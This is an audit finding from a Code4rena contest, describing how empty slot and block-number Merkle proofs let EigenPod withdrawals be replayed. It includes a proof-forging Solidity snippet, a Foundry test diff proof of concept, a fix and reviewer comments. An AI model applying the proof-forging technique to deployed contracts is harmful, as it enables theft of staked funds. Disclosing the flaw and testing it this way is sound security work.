---
tags:
  - lang/solidity
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - sector/oracle
  - sector/restaking
  - sector/staking
protocol: "[[EigenLayer]]"
auditors:
  - "[[windowhan001]]"
report: "https://code4rena.com/reports/2023-04-eigenlayer"
genome:
  - "[[frozen-funds]]"
  - "[[direct-drain]]"
  - "[[bridge-merkle-proof]]"
---
# [H-01] Slot and block number proofs not required for verification of withdrawal (multiple withdrawals possible)

- id: 20056
- impact: HIGH
- protocol: [[EigenLayer]]
- reporter: windowhan001 (Code4rena)
- source: https://code4rena.com/reports/2023-04-eigenlayer

## Summary


This bug report is about a vulnerability in two libraries, `Merkle` and `BeaconChainProofs`, and a contract `EigenPod`. The vulnerability allows multiple withdrawals of funds due to insufficient validation of proofs. The methods [verifyInclusionSha256(proof, root, leaf, index)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/Merkle.sol#L80-L87) and [verifyInclusionKeccak(proof, root, leaf, index)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/Merkle.sol#L29-L36) in the `Merkle` library will always return `true` if the proof is empty and the leaf is equal to the root. This can be exploited in the `BeaconChainProofs` library's method [verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/BeaconChainProofs.sol#L245-L295) which does not require non-zero proof lengths. This can then be exploited in the `EigenPod` contract's method [verifyAndProcessWithdrawal(withdrawalProofs, ...)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L305-L359). 

The `proofIsForValidBlockNumber(Endian.fromLittleEndianUint64(withdrawalProofs.blockNumberRoot))` modifier can

## Details


Since this is a vulnerability that involves multiple in-scope contracts and leads to more than one impact, let's start with a bug description from bottom to top.

### Library `Merkle`

The methods [verifyInclusionSha256(proof, root, leaf, index)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/Merkle.sol#L80-L87) and [verifyInclusionKeccak(proof, root, leaf, index)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/Merkle.sol#L29-L36) will **always** return `true` if `proof.length < 32` (e.g. empty proof) **and** `leaf == root`. Although this might be intended behaviour, I see no use case for empty proofs and would `require` non-empty proofs at the library level. As of now, the user of the library is **responsible** to enforce non-zero proofs.

### Library `BeaconChainProofs`

The method [verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/BeaconChainProofs.sol#L245-L295), which relies on multiple calls to [Merkle.verifyInclusionSha256(proof, root, leaf, index)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/Merkle.sol#L80-L87), does not `require` a minimum length of `proofs.slotProof` and `proofs.blockNumberProof`. As a consequence, considering a valid set of `(beaconStateRoot, proofs, withdrawalFields)`, the method will still succeed with **empty** slot and block number proofs, i.e. the `proofs` can be modified in the following way:

```solidity
proofs.slotProof = bytes("");             // empty slot proof
proofs.slotRoot = proofs.blockHeaderRoot; // make leaf == root

proofs.blockNumberProof = bytes("");                  // empty block number proof
proofs.blockNumberRoot = proofs.executionPayloadRoot; // make leaf == root
```

As a consequence, we can take a perfectly valid withdrawal proof and re-create the proof for the same withdrawal with a **different** slot and block number (according to the code above) that will still be accepted by the [verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/BeaconChainProofs.sol#L245-L295) method.

### Contract `EigenPod`

The method [verifyAndProcessWithdrawal(withdrawalProofs, ...)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L305-L359), which relies on a call to [BeaconChainProofs.verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/BeaconChainProofs.sol#L245-L295), is impacted by a modified - but still valid - withdrawal proof in two ways.

**First**, the modifier [proofIsForValidBlockNumber(Endian.fromLittleEndianUint64(withdrawalProofs.blockNumberRoot))](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L325) makes sure that the **block number** being proven is greater/newer than the `mostRecentWithdrawalBlockNumber`. In our case, `blockNumberRoot = executionPayloadRoot` and depending on the actual value of `executionPayloadRoot`, the `proofIsForValidBlockNumber` can be bypassed as shown in the test, see any PoC test case. As a consequence, old withdrawal proofs could be re-used with an empty `blockNumberProof` to withdraw the same funds more than once.

**Second**, the sub-method [\_processPartialWithdrawal(withdrawalHappenedSlot, ...)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L422-L430) requires that a **slot** is only used once. In our case, `slotRoot = blockHeaderRoot`  leads to a [different slot](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L347) than suggested by the original proof. Therefore, a withdrawal proof can be re-used with an empty `slotProof` to do the same partial withdrawal twice, see PoC. Depending on the actual value of `blockHeaderRoot`, a full withdrawal, instead of a partial withdrawal, will be done according to the [condition in L354](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L354).

Insufficient validation of proofs allows multiple withdrawals, i.e. theft of funds.

### Proof of Concept

The changes to the `EigenPod` test cases below demonstrate the following outcomes:<br>
**testFullWithdrawalProof:** [BeaconChainProofs.verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/BeaconChainProofs.sol#L245-L295) still succeeds on empty slot and block number proofs.<br>
**testFullWithdrawalFlow:** [EigenPod.verifyAndProcessWithdrawal(withdrawalProofs, ...)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L305-L359) allows full withdrawal with empty slot and block number proofs.<br>
**testPartialWithdrawalFlow:** [EigenPod.verifyAndProcessWithdrawal(withdrawalProofs, ...)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L305-L359) allows partial withdrawal with empty slot and block number proofs.<br>
**testProvingMultipleWithdrawalsForSameSlot:** [EigenPod.verifyAndProcessWithdrawal(withdrawalProofs, ...)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L305-L359) allows partial withdrawal of the same funds twice due to different `slotRoot` in original and modified proof.<br>

The [proofIsForValidBlockNumber(Endian.fromLittleEndianUint64(withdrawalProofs.blockNumberRoot))](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/pods/EigenPod.sol#L325) modifier is bypassed (see `blockNumberRoot`) in the latter three of the above test cases.

Apply the following *diff* to your `src/test/EigenPod.t.sol` and run the tests with `forge test --match-contract EigenPod`:

```diff
diff --git a/src/test/EigenPod.t.sol b/src/test/EigenPod.t.sol
index 31e6a58..5242def 100644
--- a/src/test/EigenPod.t.sol
+++ b/src/test/EigenPod.t.sol
@@ -260,7 +260,7 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {

     function testFullWithdrawalProof() public {
         setJSON("./src/test/test-data/fullWithdrawalProof.json");
-        BeaconChainProofs.WithdrawalProofs memory proofs = _getWithdrawalProof();
+        BeaconChainProofs.WithdrawalProofs memory proofs = _getWithdrawalProof(SKIP_SLOT_BLOCK_PROOF);
         withdrawalFields = getWithdrawalFields();
         validatorFields = getValidatorFields();

@@ -281,7 +281,7 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {

         // ./solidityProofGen "WithdrawalFieldsProof" 61336 2262 "data/slot_43222/oracle_capella_beacon_state_43300.ssz" "data/slot_43222/capella_block_header_43222.json" "data/slot_43222/capella_block_43222.json" fullWithdrawalProof.json
         setJSON("./src/test/test-data/fullWithdrawalProof.json");
-        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof();
+        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(SKIP_SLOT_BLOCK_PROOF);
         bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());
         withdrawalFields = getWithdrawalFields();
         validatorFields = getValidatorFields();
@@ -317,7 +317,7 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {
         //generate partialWithdrawalProofs.json with:
         // ./solidityProofGen "WithdrawalFieldsProof" 61068 656 "data/slot_58000/oracle_capella_beacon_state_58100.ssz" "data/slot_58000/capella_block_header_58000.json" "data/slot_58000/capella_block_58000.json" "partialWithdrawalProof.json"
         setJSON("./src/test/test-data/partialWithdrawalProof.json");
-        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof();
+        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(SKIP_SLOT_BLOCK_PROOF);
         bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());

         withdrawalFields = getWithdrawalFields();
@@ -346,21 +346,22 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {

     /// @notice verifies that multiple partial withdrawals can be made before a full withdrawal
     function testProvingMultipleWithdrawalsForSameSlot(/*uint256 numPartialWithdrawals*/) public {
-        IEigenPod newPod = testPartialWithdrawalFlow();
+        IEigenPod newPod = testPartialWithdrawalFlow(); // uses SKIP_SLOT_BLOCK_PROOF

-        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof();
+        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(FULL_PROOF);
         bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());
         withdrawalFields = getWithdrawalFields();
         validatorFields = getValidatorFields();

-        cheats.expectRevert(bytes("EigenPod._processPartialWithdrawal: partial withdrawal has already been proven for this slot"));
+        // do not expect revert anymore due to different 'slotRoot' on FULL_PROOF and SKIP_SLOT_BLOCK_PROOF
+        //cheats.expectRevert(bytes("EigenPod._processPartialWithdrawal: partial withdrawal has already been proven for this slot"));
         newPod.verifyAndProcessWithdrawal(withdrawalProofs, validatorFieldsProof, validatorFields, withdrawalFields, 0, 0);
     }

     /// @notice verifies that multiple full withdrawals for a single validator fail
     function testDoubleFullWithdrawal() public {
-        IEigenPod newPod = testFullWithdrawalFlow();
-        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof();
+        IEigenPod newPod = testFullWithdrawalFlow(); // uses SKIP_SLOT_BLOCK_PROOF
+        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(FULL_PROOF);
         bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());
         withdrawalFields = getWithdrawalFields();
         validatorFields = getValidatorFields();
@@ -759,8 +760,11 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {
         return proofs;
     }

+    uint256 internal constant FULL_PROOF = 0;
+    uint256 internal constant SKIP_SLOT_BLOCK_PROOF = 1;
+
     /// @notice this function just generates a valid proof so that we can test other functionalities of the withdrawal flow
-    function _getWithdrawalProof() internal returns(BeaconChainProofs.WithdrawalProofs memory) {
+    function _getWithdrawalProof(uint256 proofType) internal returns(BeaconChainProofs.WithdrawalProofs memory) {
         //make initial deposit
         cheats.startPrank(podOwner);
         eigenPodManager.stake{value: stakeAmount}(pubkey, signature, depositDataRoot);
@@ -773,9 +777,9 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {
             beaconChainOracle.setBeaconChainStateRoot(beaconStateRoot);
             bytes32 blockHeaderRoot = getBlockHeaderRoot();
             bytes32 blockBodyRoot = getBlockBodyRoot();
-            bytes32 slotRoot = getSlotRoot();
-            bytes32 blockNumberRoot = getBlockNumberRoot();
+            bytes32 slotRoot = (proofType == FULL_PROOF) ? getSlotRoot() : blockHeaderRoot; // else SKIP_SLOT_BLOCK_PROOF
             bytes32 executionPayloadRoot = getExecutionPayloadRoot();
+            bytes32 blockNumberRoot = (proofType == FULL_PROOF) ? getBlockNumberRoot() :  executionPayloadRoot; // else SKIP_SLOT_BLOCK_PROOF



@@ -786,9 +790,9 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {
             BeaconChainProofs.WithdrawalProofs memory proofs = BeaconChainProofs.WithdrawalProofs(
                 abi.encodePacked(getBlockHeaderProof()),
                 abi.encodePacked(getWithdrawalProof()),
-                abi.encodePacked(getSlotProof()),
+                (proofType == FULL_PROOF) ? abi.encodePacked(getSlotProof()) : bytes(""), // else SKIP_SLOT_BLOCK_PROOF
                 abi.encodePacked(getExecutionPayloadProof()),
-                abi.encodePacked(getBlockNumberProof()),
+                (proofType == FULL_PROOF) ? abi.encodePacked(getBlockNumberProof()) : bytes(""), // else SKIP_SLOT_BLOCK_PROOF
                 uint64(blockHeaderRootIndex),
                 uint64(withdrawalIndex),
                 blockHeaderRoot,

```

We can see that **all** the test cases are still passing, whereby the following ones are confirming the aforementioned outcomes:

    [PASS] testFullWithdrawalFlow():(address) (gas: 28517915)
    [PASS] testFullWithdrawalProof() (gas: 13185538)
    [PASS] testPartialWithdrawalFlow():(address) (gas: 28679149)
    [PASS] testProvingMultipleWithdrawalsForSameSlot() (gas: 45502286)

### Tools Used

VS Code, Foundry

### Recommended Mitigation Steps

Require a minimum length (tree height) for the slot and block number proofs in [BeaconChainProofs.verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields)](https://github.com/code-423n4/2023-04-eigenlayer/blob/5e4872358cd2bda1936c29f460ece2308af4def6/src/contracts/libraries/BeaconChainProofs.sol#L245-L295).

At least require non-empty proofs according to the following *diff*:

```diff
diff --git a/src/contracts/libraries/BeaconChainProofs.sol b/src/contracts/libraries/BeaconChainProofs.sol
index b4129bf..119baf2 100644
--- a/src/contracts/libraries/BeaconChainProofs.sol
+++ b/src/contracts/libraries/BeaconChainProofs.sol
@@ -259,6 +259,10 @@ library BeaconChainProofs {
             "BeaconChainProofs.verifyWithdrawalProofs: withdrawalProof has incorrect length");
         require(proofs.executionPayloadProof.length == 32 * (BEACON_BLOCK_HEADER_FIELD_TREE_HEIGHT + BEACON_BLOCK_BODY_FIELD_TREE_HEIGHT),
             "BeaconChainProofs.verifyWithdrawalProofs: executionPayloadProof has incorrect length");
+        require(proofs.slotProof.length >= 32,
+            "BeaconChainProofs.verifyWithdrawalProofs: slotProof has incorrect length");
+        require(proofs.blockNumberProof.length >= 32,
+            "BeaconChainProofs.verifyWithdrawalProofs: blockNumberProof has incorrect length");

         /**
          * Computes the block_header_index relative to the beaconStateRoot.  It concatenates the indexes of all the

```

**Alternative**: Non-empty proofs can also be required in the `Merkle` library.

### Assessed type

Invalid Validation

**[sorrynotsorry (lookout) commented](https://github.com/code-423n4/2023-04-eigenlayer-findings/issues/388#issuecomment-1538229800):**
 > Well demonstrated with referrable code snippets, hyperlinks, and coded POC.
> Marking as HQ.

**[Sidu28 (EigenLayer) confirmed](https://github.com/code-423n4/2023-04-eigenlayer-findings/issues/388#issuecomment-1544934936)**

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-eigenlayer-findings/issues/388#issuecomment-1572241854):**
 > The Warden has shown how, due to a lack of length check, an empty proof could be provided; which would pass validation.
> 
> This is an example of how a lack of a check can be chained into a proper exploit, and because the proof will pass, funds can be stolen.
> 
> For these reasons I agree with High Severity.

***
